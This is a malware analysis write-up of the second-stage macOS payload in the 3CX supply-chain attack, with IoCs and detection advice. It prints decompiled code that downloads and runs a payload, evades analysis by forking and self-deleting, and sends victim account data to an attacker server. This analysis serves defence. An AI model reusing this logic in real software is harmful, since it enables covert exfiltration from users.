The password is: infect3d\n\n...please though, don't infect yourself!\n\n## Background\n\n[Earlier this week, I published a blog post that added a missing puzzle piece to the 3CX](https://objective-see.org/blog/blog_0x73.html)\nsupply chain attack (attributed to the North Koreans, aka Lazarus Group).\n\nIn that post, we uncovered the trojanization component of macOS variant of the attack,\ncomprehensively analyzed it, and provided IoCs for detection. I’d recommend reading that\nwrite up, as this post, part II, continues on from were that left off.\n\n**[\"Ironing out (the macOS details) of a Smooth Operator (Part I)\"](https://objective-see.org/blog/blog_0x73.html)**\nWe ended the previous post, noting the main goal of the 1 -stage payloadst\n(libffmpeg.dylib) was to download and execute a 2nd-stage payload named UpdateAgent.\nThe following snippet of annotated decompiled code, from the 1 -stage payload shows thisst\nlogic:\n\n```\n//write out 2nd-stage payload \"UpdateAgent\"\n\n// which was just downloaded from the attacker's server\n\nstream = fopen(path2UpdateAgent, \"wb\");\n\nfwrite(bytes, length, 0x1, stream);\n\nfflush(stream);\n\nfclose(stream);\n\n//make +x\n\nchmod(path2UpdateAgent, 755);\n\n//execute\n\npopen(path2UpdateAgent, \"r\");\n\n```\n\n-----\n\nAs the attacker s servers were offline at the time of my analysis, I was unable to grab a copy\nof the UpdateAgent binary …leading me to state, “what it does is a mystery”.\n\nBut now with the UpdateAgent binary in my possession, let’s solve the mystery of what it\ndoes!\n\nNote: In order to get as much information out as quickly as possible I originally tweeted my\nanalysis of the UpdateAgent:\n\n[Tonight we dive into the 2nd-stage macOS payload, \"UpdateAgent\", from the #3CX /](https://twitter.com/hashtag/3CX?src=hash&ref_src=twsrc%5Etfw)\n[#3CXpocalypse supply-chain attack 🍎👾🔬](https://twitter.com/hashtag/3CXpocalypse?src=hash&ref_src=twsrc%5Etfw) [https://t.co/FiKVI7Fioy](https://t.co/FiKVI7Fioy)\n\n[— Patrick Wardle (@patrickwardle) March 31, 2023](https://twitter.com/patrickwardle/status/1641721723417657345?ref_src=twsrc%5Etfw)\n\n…this post both reiterates that initial analysis and builds upon it (and hey a blog post is a little\nmore readable and ‘official’).\n\n## Triage\n\n[The (SHA-1) hash for the UpdateAgent was originally published in SentinelOne report:](https://www.sentinelone.com/blog/smoothoperator-ongoing-campaign-trojanizes-3cx-software-in-software-supply-chain-attack/)\n```\n9e9a5f8d86356796162cee881c843cde9eaedfb3\n\n```\nUpdateAgent's Hash (image credit: SentinelOne)\n[WhatsYourSign shows other hashes (MD5, etc):](https://objective-see.org/products/whatsyoursign.html)\n\n\n-----\n\n(other) hashes\nYou can also see that WhatsYourSign has determine that though UpdateAgent is signed, its\nsignature is adhoc (and thus not notarized). You can confirm this with macOS’s codesign\nutility as well:\n```\n% codesign -dvvv UpdateAgent\n\nExecutable=/Users/patrick/Library/Application Support/3CX Desktop App/UpdateAgent\n\nIdentifier=payload2-55554944839216049d683075bc3f5a8628778bb8\n\nCodeDirectory v=20100 size=450 flags=0x2(adhoc) hashes=6+5 location=embedded\n\n...\n\nSignature=adhoc\n\n```\nAlso from UpdateAgent’s code signing information, we can see it’s identifier: payload2```\n55554944839216049d683075bc3f5a8628778bb8. Other Lazarus group payloads are also\n\n```\nsigned adhoc and use a similar identifier scheme. For example check out the code signing\ninformation from Lazarus’s AppleJuice.C:\n```\n% codesign -dvvv AppleJeus/C/unioncryptoupdater\n\nExecutable=/Users/patrick/Malware/AppleJeus/C/unioncryptoupdater\n\nIdentifier=macloader-55554944ee2cb96a1f5132ce8788c3fe0dfe7392\n\nCodeDirectory v=20100 size=739 flags=0x2(adhoc) hashes=15+5 location=embedded\n\nHash type=sha256 size=32\n\nSignature=adhoc\n\n```\nUsing macOS’s file command, we see the UpdateAgent binary is an x86_64 (Intel) MachO:\n```\n% file UpdateAgent\n\nUpdateAgent: Mach-O 64-bit executable x86_64\n\n\n```\n…this means that unless Rosetta is installed, it won’t run on Apple Silicon. (Recall that the\narm64 version of the 1 payload, st `libffmpeg.dylib was not trojanized).`\n\n\n-----\n\nLet s now run the strings command (with the `- option which instructs it to scan the whole`\nfile), we find strings that appear to be related to:\n\nConfig files\nConfig parameters\nAttacker server (sbmsa[.]wiki)\nMethod names of networking APIs\n```\n% strings -a UpdateAgent\n\n%s/Library/Application Support/3CX Desktop App/.main_storage\n\n%s/Library/Application Support/3CX Desktop App/config.json\n\n\"url\": \"https://\n\n\"AccountName\": \"\n\nhttps://sbmsa.wiki/blog/_insert\n\n3cx_auth_id=%s;3cx_auth_token_content=%s;__tutma=true\n\nURLWithString:\n\nrequestWithURL:\n\naddValue:forHTTPHeaderField:\n\ndataTaskWithRequest:completionHandler:\n\n\n```\nThis wraps up our triage of the UpdateAgent binary. Time to dive in deeper with our trusty\nfriends: the disassembler and debugger!\n\n## Analysis of UpdateAgent\n\nIn this section we’ll more deeply analyze the malicious logic of the UpdateAgent binary.\n\nThrowing the binary in a debugger (starting at its main), we see within the first few lines of\ncode the malware contain some basic anti-analysis logic.\n\nForks itself via fork\n\nThis slightly complicates debugging, as forking creates a new process (vs. the parent,\nwe’re debugging).\n\nSelf-deletes via ulink\n\nThis can thwart file-based AV scanners, or simply make it harder to find/grab the binary\nfor analysis!\n\n\n-----\n\n```\nint main(int argc, const char argv[]) {\n\n  if (fork() == 0) {\n\n      //in child\n\n      ...\n\n      unlink(argv[0]);\n\n  else\n\n    exit(0);\n\n```\nAs noted, when fork executes, a new (child) process is created. We can see that in the\nabove disassembly, the parent will then exit …while the child will continue on executing. So,\nif we’re debugging the parent our debugging session will terminate. There are debugger\ncommands that can follow the child, but IMHO its easier to just set a breakpoint on the fork,\nthen skip over it (via the register write $pc <address of instruction after fork>)\naltogether.\n\nWe also noted the child process (the parent has exited), will delete itself via the unlink API.\n[This is readily observable via a file monitor, which capture thes](https://objective-see.org/products/utilities.html#FileMonitor)\n```\nES_EVENT_TYPE_NOTIFY_UNLINK event of the UpdateAgent file by the UpdateAgent process:\n# FileMonitor.app/Contents/MacOS/FileMonitor -pretty -json -filter UpdateAgent\n\n{\n\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_UNLINK\",\n\n \"file\" : {\n\n  \"destination\" : \"~/Library/Application Support/3CX Desktop App/UpdateAgent\",\n  ...\n\n  \"process\" : {\n\n    \"pid\" : 38206,\n\n    \"name\" : \"UpdateAgent\",\n\n    \"path\" : \"~/Library/Application Support/3CX Desktop App/UpdateAgent\"\n\n  }\n\n }\n\n}\n\n\n```\nNext, as the malware has not stripped its symbols nor obfuscated its strings, in a\ndisassembler see the malware performing the following:\n\nCalls a function called parse_json_config\nCalls a function called read_config\nCalls a function named enc_text\nBuilds a string (\"3cx_auth_id=...\" + ?)\nCalls a function named send_post passing in the URI\n```\n   https://sbmsa.wiki/blog/_insert\n\n```\nLet’s explore each of these, starting with the call to the malware’s parse_json_config\nfunction.\n\n\n-----\n\nThis attempts to open a file, config.json (in ~/Library/Application Support/3CX\n```\nDesktop App).\nAccording to an email I received (thanks Adam!) this appears to be a\n\n```\nlegitimate configuration file, that is part of 3CX’s app.\n\n[We can observe the malware opening the configuration file in a file monitor:](https://objective-see.org/products/utilities.html#FileMonitor)\n```\n# FileMonitor.app/Contents/MacOS/FileMonitor -pretty -json -filter UpdateAgent\n\n{\n\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_OPEN\",\n\n \"file\" : {\n\n  \"destination\" : \"~/Library/Application Support/3CX Desktop App/config.json\",\n\n  ...\n\n  \"process\" : {\n\n    \"pid\" : 38206,\n\n    \"name\" : \"UpdateAgent\",\n\n    \"path\" : \"~/Library/Application Support/3CX Desktop App/UpdateAgent\"\n\n  }\n\n }\n\n}\n\n\n\n```\nOnce it has opened this file, UpdateAgent looks for values from the keys: url and\n```\nAccountName, as we can see in the annotated disassembly:\nint parse_json_config(int arg0) {\n\n  ...\n\n  sprintf(&var_1230, \"%s/Library/Application Support/3CX Desktop App/config.json\",\narg0);\n\n  rax = fopen(&var_1230, \"r\");\n\n  ...\n\n  fread(&var_1030, rsi, 0x1, r12);\n\n  rax = strstr(&var_1030, \"\\\"url\\\": \\\"https://\");\n\n  ...\n\n  rax = strstr(&var_1030, \"\\\"AccountName\\\": \\\"\");\n\n```\nHere’s a snippet from a legitimate 3CX config.json file, showing an example of such\nvalues:\n```\n{\n\n  \"ProvisioningSettings\": {\n\n    \"url\":\n\"https://servicemax.3cx.com/provisioning/<redacted>/<redacted>/<redacted>.xml\",\n\n    \"file\": {\n\n      \"Extension\": \"00\",\n\n      ...\n\n      \"GCMSENDERID\": \"\",\n\n      \"AccountName\": \"<redacted>\",\n\n```\n\n-----\n\nFrom this, we can see the url key appears to contain a link to the xml provisioning file for the\nVOIP system. On the other hand, AccountName is full name of the account owner.\n\nIf the config.json file is not found, the malware exits. As I didn't have the 3CX app fully\ninstalled, to keep the malware happily executing so I could continue (dynamic) analysis I\ncreated a dummy config.json (containing the expected keys, with some random values).\n\nWith the values of url and AccountName extracted from the config.json file the malware\nthen calls a function named read_config.\n\nThis opens and then reads in the contents of the .main_storage file. Recall that this file\ncreated by the 1 -stage payload (st `libffmpeg.dylib) and contains a UUID - likely uniquely`\nidentifying the victim. The read_config function then de-XORs the UUID with the key 0x7a.\n```\nint read_config(int * arg0, void * arg1) {\n\n  ...\n\n  sprintf(&var_230, \"%s/Library/Application Support/3CX Desktop App/.main_storage\",\narg0);\n\n  handle = fopen(&var_230, \"rb\");\n\n  fread(buffer, 0x38, 0x1, rax);\n\n  fclose(handle);\n\n  index = 0x0;\n\n  do {\n\n    *(buffer + index) = *(buffer + index) ^ 0x7a;\n\n    index++;\n\n  } while (index != 0x38);\n\n```\nOnce the read_config has returned, the malware concatenates the url and AccountName\nand then encrypts them via a function named enc_text. Next it combines this encrypted\nstring with the de-XOR’d UUID (from the .main_storage file).\n\nThese values are combined in the following parameterized string:\n```\n3cx_auth_id=UUID;3cx_auth_token_content=encryted url;account name;__tutma=true\n\n```\nWe can dump this in a debugger:\n```\n% lldb UpdateAgent\n\n...\n\n(lldb) x/s 0x304109390: \"3cx_auth_id=3725e81e-0519-7f09-72ac35641c94c1cf;3cx_auth_token_content=S&per>ogZZGA55{ujj[MCC3&dol>wweZPP@&semi>4#riiZLBB\n-!!pbWWE@&semi>0xppZQII5&plus>}}sjb;__tutma=true\"\n\n\n```\n\n-----\n\nNow the malware is ready to send this information to the attacker s remote server. This is\naccomplished via a function the malware names send_post. It takes as several parameters\nincluding the remote server/API endpoint https://sbmsa.wiki/blog/_insert and the\n```\n3cx_auth_id=... string:\nenc_text(&input, &output);\n\nsprintf(&paramString, \"3cx_auth_id=%s;3cx_auth_token_content=%s;__tutma=true\", &UUID,\n&output);\n\n...\n\nsend_post(\"https://sbmsa.wiki/blog/_insert\", &paramString, &var_1064);\n\n\n```\nThe send_post function configures an URL request with a hard-coded user-agent string\n(\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like\n```\nGecko) Chrome/108.0.5359.128 Safari/537.36) and add the 3cx_auth_id=... parameter\n\n```\nstring in the “Cookie” HTTP header.\n\nThen, via the nsurlsession’s dataTaskWithRequest:completionHandler: method the\nmalware makes the request to https://sbmsa.wiki/blog/_insert.\n\nVia my [DNSMonitor, we can observe (the initial part, the DNS resolution) of this:](https://objective-see.org/products/utilities.html#DNSMonitor)\n```\n% DNSMonitor.app/Contents/MacOS/DNSMonitor -json -pretty\n\n[{\n \"Process\" : {\n\n  \"pid\" : 40063,\n\n  \"signing ID\" : \"payload2-55554944839216049d683075bc3f5a8628778bb8\",\n\n  \"path\" : \"\\/Users\\/patrick\\/Library\\/Application Support\\/3CX Desktop\nApp\\/UpdateAgent\"\n\n },\n\n \"Packet\" : {\n\n  \"Opcode\" : \"Standard\",\n\n  \"QR\" : \"Query\",\n\n  \"Questions\" : [\n\n   {\n\n    \"Question Name\" : \"sbmsa.wiki\",\n\n    \"Question Class\" : \"IN\",\n\n    \"Question Type\" : \"?????\"\n\n   }\n\n  ],\n\n  \"RA\" : \"No recursion available\",\n\n  \"Rcode\" : \"No error\",\n\n  \"RD\" : \"Recursion desired\",\n\n  \"XID\" : 25349,\n\n  \"TC\" : \"Non-Truncated\",\n\n  \"AA\" : \"Non-Authoritative\"\n\n }\n\n}\n\n```\n\n-----\n\n…unfortunately (for our continued analysis efforts) as the sbmsa.wiki server is offline, the\nconnection fails.\n```\n% nslookup sbmsa.wiki\n\n;; connection timed out; no servers could be reached\n\n\n```\nStill, we can continue static analysis of the UpdateAgent binary to see what it would do if the\nattacker’s server was (still) online.\n\n…the answer is though, appears to be, nothing:\n```\nint main(int argc, const char * argv[]) {\n\n...\n\nresponse = send_post(\"https://sbmsa.wiki/blog/_insert\", &paramString, &var_1064);\n\nif (response != 0x0) {\n\n  free(response);\n\n}\n\nreturn 0;\n\n\n```\nAs the decompilation shows, once the send_post returns, the response is freed. Then, the\nfunction, returns. As the function (that invokes send_post and then simply returns) is main,\nthis means the process is exiting.\n\nThis might at first seem a bit strange …wouldn’t we expect the UpdateBinary to do\nsomething after it has received a response? Usually we see malware treating a response as\ntasking (and thus then executing some attacker-specified commands), or, as was the case\nwith the 1 -stage payload, saving and executing the response as an next-stage payload.st\n\nHowever if take a closer look at UpdateAgent’s URI API endpoint, recall it’s\n```\nhttps://sbmsa.wiki/blog/_insert …maybe the purpose of UpdateAgent is simply to\n\n```\nreport information about its victims …inserting them into some back-end server (found at the\n```\n_insert endpoint). This would make sense a supply-chain attacks indiscriminately infect a\n\n```\nlarge number of victims, most of whom to a nationstate APT group (e.g. Lazarus) are of little\ninterest.\n\n[This concept is well articulated by J. A. Guerrero-Saade who noted:](https://twitter.com/juanandres_gs)\n\nThat’s up to say, the [supply-chain] attacker gets thousands of victims, collects\neverything they need for future compromises, profiles their haul, and decides how to\nmaximize that access.\n\n\n-----\n\nThat s up to say, the attacker gets thousands of victims, collects everything they need\nfor future compromises, profiles their haul, and decides how to maximize that access.\n[Think— trojanizing CCleaner suspected of leading to @ASUS LiveUpdate](https://twitter.com/ASUS?ref_src=twsrc%5Etfw)\ncompromise. [https://t.co/CDbMKdrulQ](https://t.co/CDbMKdrulQ)\n\n[— J. A. Guerrero-Saade (@juanandres_gs) April 1, 2023](https://twitter.com/juanandres_gs/status/1642151623605510144?ref_src=twsrc%5Etfw)\n\nAlso worth recalling that each time the 1 -stage payload was run, it would (re)download andst\n(re)execute UpdateAgent …meaning at any time the Lazarus group hacker’s could for\ntargets of interest, update/swap out the UpdateAgent’s code, perhaps for a persistent, fully\nfeatured implant.\n\n## Detection / Protection\n\n\nLet’s end by talking how to detect and protect against this 2nd-stage payload.\n\nFirst, detection should be trivial, as many of components of the malware are hard-coded and\nthus static:\n\nFile based IoCs (found in ~/Library/Application Support/3CX Desktop App/)\n```\n   .main_storage\n   UpdateAgent (though as this self-deletes, it might be gone)\n\n```\nEmbedded Domain:\n```\n   https://sbmsa.wiki/blog/_insert\n\n```\nIn terms of detentions, Objective-See’s free open-source tools can help!\n\nFirst, [BlockBlock (running in “Notarization” mode) will both detect and block UpdateAgent](https://objective-see.org/products/blockblock.html)\nbefore it’s allowed to execute …as the malware is not notarized:\n\n\n-----\n\nBlockBlock ...block blocking!\n[At the network level, as we showed earlier DNSMonitor, will detect when the malware](https://objective-see.org/products/utilities.html#DNSMonitor)\nattempts to resolve the domain named of its remote server:\n```\n% DNSMonitor.app/Contents/MacOS/DNSMonitor -json -pretty\n\n[{\n \"Process\" : {\n\n  \"pid\" : 40063,\n\n  \"signing ID\" : \"payload2-55554944839216049d683075bc3f5a8628778bb8\",\n\n  \"path\" : \"\\/Users\\/patrick\\/Library\\/Application Support\\/3CX Desktop\nApp\\/UpdateAgent\"\n\n },\n\n \"Packet\" : {\n\n  \"Opcode\" : \"Standard\",\n\n  \"QR\" : \"Query\",\n\n  \"Questions\" : [\n\n   {\n\n    \"Question Name\" : \"sbmsa.wiki\",\n\n    \"Question Class\" : \"IN\",\n\n    \"Question Type\" : \"?????\"\n\n   }\n\n  ],\n\n  \"RA\" : \"No recursion available\",\n\n  \"Rcode\" : \"No error\",\n\n  \"RD\" : \"Recursion desired\",\n\n  \"XID\" : 25349,\n\n  \"TC\" : \"Non-Truncated\",\n\n  \"AA\" : \"Non-Authoritative\"\n\n }\n\n}\n\n```\n\n-----\n\nFinally [LuLu can also detect the malware s unauthorized network access. What really can tip](https://objective-see.org/products/lulu.html)\nus off that something is amiss based on LuLu’s alert is that the program, UpdateAgent\naccessing the internet has self-deleted (and thus is struck through in the alert):\n\nLuLu ...detecting unauthorized network access\nMake sure you are running the latest version of LuLu (v2.4.3) that improved the handling of\nself-deleted processes.\n\n## Conclusion\n\nToday we added a missing yet another puzzle piece to the 3CX supply chain attack. Here, for\nthe first time, we detailed the attacker’s 2nd macOS payload: UpdateAgent.\n\nMoreover, we provided IoCs for detection and described how our free, open-source tools\ncould provide protection, even with no a priori knowledge of this threat!\n\nI want to end by including an awesome diagrammatic overview of (macOS components) of\n[the 3CX supply chain attack, created by the talented Thomas Roccia, as it provides a great](https://twitter.com/fr0gger_)\nvisual overview of what we covered in both our part I and part II writeups!\n\n\n-----\n\nOverView (image credit: Thomas Roccia (fr0gger ))\n\n\n-----\n\n**Interested in Mac Malware Analysis Techniques?**\n\nYou're in luck, as I've written a book on this topic!
